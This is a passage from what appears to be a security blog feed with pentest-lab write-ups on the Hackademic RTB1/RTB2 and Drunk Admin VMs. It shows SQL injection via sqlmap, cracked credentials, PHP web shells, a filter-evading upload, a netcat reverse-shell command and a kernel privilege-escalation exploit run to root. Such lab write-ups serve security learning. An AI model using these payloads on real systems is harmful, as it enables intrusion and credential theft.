</span><span class='line'>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE ''%' GROUP BY title ORDER BY title
</span><span class='line'>'</span></code></pre></td></tr></table></div></figure>


<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username usertype    password
</span><span class='line'>Administrator Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
</span><span class='line'>JSmith    Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
</span><span class='line'>BTallor   Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
</span><span class='line'>hacky Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL</span></code></pre></td></tr></table></div></figure>


<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/* Database Settings */
</span><span class='line'>var $dbtype = 'mysql';
</span><span class='line'>var $host = 'localhost';
</span><span class='line'>var $user = 'root';
</span><span class='line'>var $password = 'yUtJklM97W';
</span><span class='line'>var $db = 'joomla';
</span><span class='line'>var $dbprefix = 'jos_';</span></code></pre></td></tr></table></div></figure>


<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span>
</span><span class='line'><span class="ss">&quot;&lt;? system($_REQUEST[&#39;cmd&#39;]); ?&gt;&quot;</span>
</span><span class='line'><span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="ss">&quot;/var/www/cmd.php&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
</span><span class='line'> 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: can't access tty; job control turned off</span></code></pre></td></tr></table></div></figure>


<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[snipped]
</span><span class='line'>[*] Restoring function pointer...
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root)
</span><span class='line'>ls /root/
</span><span class='line'>Desktop
</span><span class='line'>Key.txt</span></code></pre></td></tr></table></div></figure>


<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
</span><span class='line'>root@pwnbox:~/Downloads#file decoded
</span><span class='line'>decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-win.png" title="hackademic rtb2" alt="hackademic rtb 2 finished"></p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You are only young once, but you can \
</span><span class='line'>\ stay immature indefinitely.          /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
    <updated>2016-07-18T09:00:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>

<!-- more -->


<h1>Recon</h1>

<p>I started with a port scan of the target, but only the 80 port is open:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-web.png" title="hackademic" alt="hackademic website"></p>

<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-sqli.png" title="sqli" alt="sql error"></p>

<h1>Exploit</h1>

<p>Next I enumerated the databases with Sqlmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
</span><span class='line'>available databases [3]:
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] wordpress</span></code></pre></td></tr></table></div></figure>


<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
</span><span class='line'>Database: wordpress
</span><span class='line'>[9 tables]
</span><span class='line'>+-------------------+
</span><span class='line'>| wp_categories     |
</span><span class='line'>| wp_comments       |
</span><span class='line'>| wp_linkcategories |
</span><span class='line'>| wp_links          |
</span><span class='line'>| wp_options        |
</span><span class='line'>| wp_post2cat       |
</span><span class='line'>| wp_postmeta       |
</span><span class='line'>| wp_posts          |
</span><span class='line'>| wp_users          |
</span><span class='line'>+-------------------+</span></code></pre></td></tr></table></div></figure>


<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user_pass                user_login
</span><span class='line'>21232f297a57a5a743894a0e4a801fc3  NickJames
</span><span class='line'>b986448f0bb9e5e124ca91d3d650f52c  JohnSmith
</span><span class='line'>7cbb3252ba6b7e9c422fac5334d22054  GeorgeMiller
</span><span class='line'>a6e514f9486b83cb53d8d932f9a04292  TonyBlack
</span><span class='line'>8601f6e1028a8e8a966f6c33fcd9aec4  JasonKonnors
</span><span class='line'>50484c19f1afdaf3841a0d821ed393d2  MaxBucky</span></code></pre></td></tr></table></div></figure>


<p>Cracking the hashes revealed the passwords of all the users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin
</span><span class='line'>PUPPIES
</span><span class='line'>q1w2e3
</span><span class='line'>napoleon
</span><span class='line'>maxwell
</span><span class='line'>kernel</span></code></pre></td></tr></table></div></figure>


<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-panel.png" title="dashboard" alt="admin panel"></p>

<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-404.png" title="404.php" alt="php file edited"></p>

<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
</span><span class='line'>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
</span><span class='line'> 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=48(apache) gid=489(apache) groups=489(apache)
</span><span class='line'>sh: no job control in this shell</span></code></pre></td></tr></table></div></figure>


<h2>Privilege escalation</h2>

<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.0$ ./rds
</span><span class='line'>./rds
</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
</span><span class='line'>[*] by Dan Rosenberg
</span><span class='line'>[*] Resolving kernel addresses...
</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'>[*] Overwriting security ops...
</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
</span><span class='line'>[*] by Dan Rosenberg
</span><span class='line'>[*] Resolving kernel addresses...
</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'>[*] Overwriting security ops...
</span><span class='line'>[*] Overwriting function pointer...
</span><span class='line'>[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
</span><span class='line'>[*] by Dan Rosenberg
</span><span class='line'>[*] Resolving kernel addresses...
</span><span class='line'> [+] Resolved security_ops to 0xc0aa19ac
</span><span class='line'> [+] Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> [+] Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> [+] Resolved commit_creds to 0xc044e5f1
</span><span class='line'> [+] Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'>[*] Overwriting security ops...
</span><span class='line'>[*] Overwriting function pointer...
</span><span class='line'>[*] Triggering payload...
</span><span class='line'>[*] Restoring function pointer...
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root)
</span><span class='line'>cat /root/key.txt
</span><span class='line'>Yeah!!
</span><span class='line'>You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
</span><span class='line'>
</span><span class='line'>$_d&jgQ&gt;&gt;ak\#b"(Hx"o&lt;la_%
</span><span class='line'>
</span><span class='line'>Regards,
</span><span class='line'>mr.pr0n || p0wnbox.Team || 2011
</span><span class='line'>http://p0wnbox.com</span></code></pre></td></tr></table></div></figure>


<h1>Debriefing</h1>

<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>

<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Don't relax! It's only your tension \
</span><span class='line'>\ that's holding you together.        /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
    <updated>2016-06-12T11:51:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<!-- more -->


<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE REASON         VERSION
</span><span class='line'>22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
</span><span class='line'>8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))</span></code></pre></td></tr></table></div></figure>


<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/tripios.png" title="tripios" alt="tripios image hosting"></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/upload.png" title="upload" alt="uploaded image"></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#nc -vvnlp 5555
</span><span class='line'>listening on [any] 5555 ...
</span><span class='line'>connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
</span><span class='line'>ls /home
</span><span class='line'>bob
</span><span class='line'>ls /home/bob/
</span><span class='line'>Documents
</span><span class='line'>public_html</span></code></pre></td></tr></table></div></figure>


<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -a /var/www
</span><span class='line'>.
</span><span class='line'>..
</span><span class='line'>.htaccess
</span><span class='line'>.proof
</span><span class='line'>image.php
</span><span class='line'>images
</span><span class='line'>index.php
</span><span class='line'>info.php
</span><span class='line'>myphp.php
</span><span class='line'>style
</span><span class='line'>upload.php
</span><span class='line'>xmm.html</span></code></pre></td></tr></table></div></figure>


<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .proof
</span><span class='line'>#########################
</span><span class='line'># Drunk Admin Challenge #
</span><span class='line'>#     by @anestisb    #
</span><span class='line'>#########################
</span><span class='line'>
</span><span class='line'>bob&gt; Great work.
</span><span class='line'>bob&gt; Meet me there.
</span><span class='line'>...&gt; ?
</span><span class='line'>bob&gt; What? You don't know where?
</span><span class='line'>bob&gt; Work a little more your post
</span><span class='line'>     exploitation skills.
</span><span class='line'>
</span><span class='line'>Secret Code:
</span><span class='line'>TGglMUxecjJDSDclN1Ej
</span><span class='line'>
</span><span class='line'>Mail me your methods at:
</span><span class='line'>anestis@bechtsoudis.com</span></code></pre></td></tr></table></div></figure>


<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /home/bob/public_html
</span><span class='line'>encrypt.php
</span><span class='line'>include
</span><span class='line'>index.php</span></code></pre></td></tr></table></div></figure>


<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/secret.png" title="secret" alt="secret decryption"></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
</span><span class='line'>
